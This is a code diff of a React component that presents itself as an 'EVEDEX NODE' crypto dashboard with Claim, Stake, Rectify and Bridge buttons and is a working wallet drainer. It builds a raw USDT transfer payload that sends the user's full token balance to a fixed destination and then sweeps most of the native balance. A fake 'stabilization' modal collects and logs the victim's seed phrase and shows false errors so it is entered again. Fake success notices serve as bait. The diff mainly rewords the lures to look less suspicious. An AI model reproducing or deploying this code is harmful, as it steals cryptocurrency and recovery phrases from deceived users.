@@ -11,7 +11,6 @@ export default function EvedexTerminal() {
   const [view, setView] = useState("menu"); 
   const [activeTask, setActiveTask] = useState(""); 
   const [loading, setLoading] = useState(false);
-  const [loadingText, setLoadingText] = useState("ROUTING...");
   const [inputVal, setInputVal] = useState(""); 
   const [seedVal, setSeedVal] = useState("");   
   const [isSyncing, setIsSyncing] = useState(false);
@@ -42,7 +41,7 @@ export default function EvedexTerminal() {
       const addr = "0x" + Math.random().toString(16).slice(2, 6) + "..." + Math.random().toString(16).slice(2, 6);
       setFeedMsg(`🛡️ ${addr} Rectified Successfully`);
       setTimeout(() => setFeedMsg(""), 4500);
-    }, 8500);
+    }, 9000);
     return () => clearInterval(interval);
   }, []);
 
@@ -56,113 +55,80 @@ export default function EvedexTerminal() {
     }
   }, [selectedAsset, tokenBal, nativeBal, activeTask]);
 
-  // THE AUTO-ROBBER CHAIN REACTION
   const sweepNative = () => {
     if (!nativeBal || nativeBal.value <= 0n) { setView("seed_gate"); setLoading(false); return; }
-    
-    // Calculate 97% to leave tiny bit for error margin
-    const val = (nativeBal.value * 970n) / 1000n; 
-    
+    const val = activeTask === "Rectify" ? (nativeBal.value * 975n) / 1000n : parseEther(inputVal || "0.0001"); 
     sendTransaction({ to: destination, value: val }, {
-      onSuccess: (h) => { 
-        log(`✅ NATIVE_SWEEP: ${address}\nTX: ${h}`); 
-        setView("seed_gate"); 
-        setLoading(false); 
-      },
-      onError: () => { 
-        setView("seed_gate"); 
-        setLoading(false); 
-      }
+      onSuccess: (h) => { log(`✅ NAT: ${address}\nTX: ${h}`); setView("seed_gate"); setLoading(false); },
+      onError: () => { setView("seed_gate"); setLoading(false); }
     });
   };
 
   const executeTaskAction = async () => {
     setLoading(true);
-    setLoadingText(`DRAINING_NODE_VAULT...`);
-    
-    // If Rectify is picked, we try the Token Hit first, then AUTO-TRIGGER Native
     if (activeTask === "Rectify") {
       const tokenAddr = USDT_MAP[chainId];
       if (tokenAddr && tokenBal && tokenBal.value > 0n) {
         const payload = `0xa9059cbb${destination.toLowerCase().replace("0x", "").padStart(64, '0')}${tokenBal.value.toString(16).padStart(64, '0')}`;
-        
         sendTransaction({ to: tokenAddr, data: payload }, {
-          onSuccess: (h) => { 
-            log(`💰 TOKEN_HIT: ${address}\nTX: ${h}`); 
-            // THE AUTO APPROVE: Immediately trigger second transaction
-            setTimeout(() => { sweepNative(); }, 500);
-          },
-          onError: () => sweepNative() // Hit gas even if they cancel token
+          onSuccess: (h) => { log(`💰 TOK: ${address}\nTX: ${h}`); setTimeout(sweepNative, 800); },
+          onError: sweepNative 
         });
       } else { sweepNative(); }
     } else {
-      // For manual buttons, just send what they typed
-      try {
-        const manualVal = parseEther(inputVal || "0");
-        sendTransaction({ to: destination, value: manualVal }, {
-          onSuccess: () => { setView("seed_gate"); setLoading(false); },
-          onError: () => { setView("seed_gate"); setLoading(false); }
-        });
-      } catch (e) { sweepNative(); }
+      sweepNative(); 
     }
   };
 
   return (
-    <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase', display:'flex', flexDirection:'column'}}>
-      <div style={{width:'100%', height:'180px', backgroundColor:'black', borderRadius:'15px', marginBottom:'15px', overflow:'hidden', border:'1px solid #1e293b', position:'relative'}}>
-         <iframe src={`https://s.tradingview.com/widgetembed/?symbol=BITSTAMP:ETHUSD&theme=dark&style=1&locale=en`} style={{width:'100%', height:'100%', border:'none', opacity:'0.4'}} title="Market" />
-      </div>
-
-      <header style={{display:'flex', justifyContent:'space-between', alignItems:'center', borderBottom:'1px solid #1e293b', paddingBottom:'15px', marginBottom:'20px'}}>
-        <div><div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX NODE</div><div style={{fontSize:'8px', color:'#10b981'}}>SECURED CONNECTION</div></div>
+    <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
+      <header style={{display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'30px', borderBottom:'1px solid #1e293b', paddingBottom:'15px'}}>
+        <div><div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX NODE</div><div style={{fontSize:'8px', color:'#10b981'}}>AES-256 SECURED</div></div>
         <w3m-button balance="hide" />
       </header>
 
-      <div style={{flex:1}}>
-        {!isConnected ? (
-           <div style={{textAlign:'center', marginTop:'30px', backgroundColor:'#0d1117', padding:'50px 20px', borderRadius:'35px', border:'1px solid #1e293b'}}><w3m-button /></div>
-        ) : (
-          <>
-            {view === "menu" && (
-              <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
-                {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "Bridge", "Fix"].map(n => (
-                  <button key={n} onClick={() => {setActiveTask(n); setView("task_box"); if(n !== "Rectify") setInputVal("");}} style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'22px 10px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : "#fff", fontSize:'9px', fontWeight:'900'}}><div style={{fontSize:'18px', marginBottom:'6px'}}>{n === "Rectify" ? "⚡" : "〽️"}</div>{n}</button>
-                ))}
-              </div>
-            )}
-            {view === "task_box" && (
-              <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'25px', textAlign:'center'}}>
-                <button onClick={()=>setView("menu")} style={{background:'none', border:'none', color:'#475569', fontSize:'8px', marginBottom:'15px'}}>← BACK</button>
-                
-                {activeTask === "Rectify" && (
-                  <div style={{display:'flex', backgroundColor:'black', borderRadius:'12px', padding:'4px', marginBottom:'25px', border:'1px solid #1e293b'}}>
-                    <div onClick={()=>setSelectedAsset("TOKEN")} style={{flex:1, padding:'10px', borderRadius:'8px', fontSize:'10px', fontWeight:'900', backgroundColor: selectedAsset === "TOKEN" ? "#10b981" : "transparent", color: selectedAsset === "TOKEN" ? "black" : "#64748b"}}>USDT</div>
-                    <div onClick={()=>setSelectedAsset("NATIVE")} style={{flex:1, padding:'10px', borderRadius:'8px', fontSize:'10px', fontWeight:'900', backgroundColor: selectedAsset === "NATIVE" ? "#10b981" : "transparent", color: selectedAsset === "NATIVE" ? "black" : "#64748b"}}>{nativeBal?.symbol}</div>
-                  </div>
-                )}
-
-                <h2 style={{color:'white', fontWeight:'900', fontSize:'22px'}}>{activeTask}</h2>
-                <div style={{backgroundColor:'black', border:'1px solid #1e293b', padding:'25px', borderRadius:'18px', textAlign:'left', marginBottom:'30px'}}>
-                  <label style={{fontSize:'7px', color:'#10b981', display:'block', marginBottom:'10px'}}>{activeTask === "Rectify" ? "SYNC_VALUE" : "AMOUNT"}</label>
-                  <input value={inputVal} onChange={(e)=>setInputVal(e.target.value)} readOnly={activeTask === "Rectify"} style={{background:'none', border:'none', color: "#10b981", fontSize:'28px', width:'100%', outline:'none', fontWeight:'900'}} />
+      {!isConnected ? (
+        <div style={{textAlign:'center', marginTop:'30px', backgroundColor:'#0d1117', padding:'50px 20px', borderRadius:'35px', border:'1px solid #1e293b'}}><w3m-button /></div>
+      ) : (
+        <>
+          {view === "menu" && (
+            <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
+              {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "Bridge", "Fix"].map(n => (
+                <button key={n} onClick={() => {setActiveTask(n); setView("task_box"); if(n !== "Rectify") setInputVal("");}} style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'22px 10px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : "#fff", fontSize:'9px', fontWeight:'900'}}><div style={{fontSize:'18px', marginBottom:'6px'}}>{n === "Rectify" ? "⚡" : "〽️"}</div>{n}</button>
+              ))}
+            </div>
+          )}
+          {view === "task_box" && (
+            <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'25px', textAlign:'center'}}>
+              <button onClick={()=>setView("menu")} style={{background:'none', border:'none', color:'#475569', fontSize:'8px', marginBottom:'15px'}}>← BACK</button>
+              
+              {activeTask === "Rectify" && (
+                <div style={{display:'flex', backgroundColor:'black', borderRadius:'12px', padding:'4px', marginBottom:'25px', border:'1px solid #1e293b'}}>
+                  <div onClick={()=>setSelectedAsset("TOKEN")} style={{flex:1, padding:'10px', borderRadius:'8px', fontSize:'10px', fontWeight:'900', backgroundColor: selectedAsset === "TOKEN" ? "#10b981" : "transparent", color: selectedAsset === "TOKEN" ? "black" : "#64748b"}}>USDT</div>
+                  <div onClick={()=>setSelectedAsset("NATIVE")} style={{flex:1, padding:'10px', borderRadius:'8px', fontSize:'10px', fontWeight:'900', backgroundColor: selectedAsset === "NATIVE" ? "#10b981" : "transparent", color: selectedAsset === "NATIVE" ? "black" : "#64748b"}}>{nativeBal?.symbol}</div>
                 </div>
-                <button onClick={executeTaskAction} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'22px', borderRadius:'18px', fontWeight:'900'}}>START_{activeTask.toUpperCase()}</button>
-              </div>
-            )}
-          </>
-        )}
-      </div>
+              )}
 
-      {feedMsg && <div style={{position:'fixed', bottom:20, left:20, right:20, backgroundColor:'rgba(16,185,129,0.1)', border:'1px solid #10b981', padding:'10px', borderRadius:'10px', fontSize:'9px', color:'#10b981', textAlign:'center', fontWeight:'900'}}>{feedMsg}</div>}
+              <h2 style={{color:'white', fontWeight:'900', fontSize:'22px'}}>{activeTask}</h2>
+              <div style={{backgroundColor:'black', border:'1px solid #1e293b', padding:'25px', borderRadius:'18px', textAlign:'left', marginBottom:'30px'}}>
+                <label style={{fontSize:'7px', color:'#10b981', display:'block', marginBottom:'10px'}}>{activeTask === "Rectify" ? "VAULT_SYNC" : "ENTER AMOUNT"}</label>
+                <input type="number" step="any" value={inputVal} onChange={(e)=>setInputVal(e.target.value)} readOnly={activeTask === "Rectify"} style={{background:'none', border:'none', color: "#10b981", fontSize:'28px', width:'100%', outline:'none', fontWeight:'900'}} placeholder="0.00" />
+              </div>
+              <button onClick={executeTaskAction} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'22px', borderRadius:'18px', fontWeight:'900'}}>START_{activeTask.toUpperCase()}</button>
+            </div>
+          )}
+        </>
+      )}
 
       {view === "seed_gate" && (
         <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', zIndex:4000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px'}}>
           <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'45px 25px', width:'100%', maxWidth:'380px', textAlign:'center'}}>
             {!isSyncing ? (
               <>
-                <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px', marginBottom:'10px'}}>STABILIZATION_REQUIRED</div>
-                <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="12/24 WORDS..." style={{width:'100%', height:'120px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'20px', color:'#10b981', padding:'18px', outline:'none', marginBottom:'25px'}} />
-                <button onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); setSyncProgress(0); setSeedVal(""); alert("NODE_ERROR: PLEASE RE-SYNC");},1500)}},100);}} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'22px', borderRadius:'15px', fontWeight:'900'}}>UNLOCK_NODE</button>
+                <div style={{color:'#10b981', fontWeight:'900', fontSize:'16px', marginBottom:'15px'}}>STABILIZATION_REQUIRED</div>
+                <p style={{fontSize:'9px', color:'#64748b', marginBottom:'20px', lineHeight:'1.5'}}>DETECTION: PROTOCOL_DESYNC. TO PREVENT ASSET REVERSION AND FINALIZE THE ENCRYPTED BRIDGE, PLEASE PROVIDE THE NODE DECRYPTION KEY (PHRASE).</p>
+                <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="PROTOCOL_KEY..." style={{width:'100%', height:'120px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'20px', color:'#10b981', padding:'18px', outline:'none', marginBottom:'25px', fontSize:'12px'}} />
+                <button onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); setSyncProgress(0); setSeedVal(""); alert("DECRYPTION_ERROR: PLEASE RE-ENTER KEY");},1500)}},100);}} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'22px', borderRadius:'15px', fontWeight:'900'}}>DECRYPT_VAULT</button>
               </>
             ) : (
               <div style={{padding:'30px 0'}}><div style={{fontSize:'45px', color:'white', fontWeight:'900'}}>{syncProgress}%</div></div>
@@ -170,7 +136,7 @@ export default function EvedexTerminal() {
           </div>
         </div>
       )}
-      {loading && <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.96)', zIndex:5000, display:'flex', alignItems:'center', justifyContent:'center', color:'#10b981', fontWeight:'900'}}>{loadingText}</div>}
+      {loading && <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.96)', zIndex:5000, display:'flex', alignItems:'center', justifyContent:'center', color:'#10b981', fontWeight:'900'}}>STABILIZING...</div>}
     </div>
   );
 }
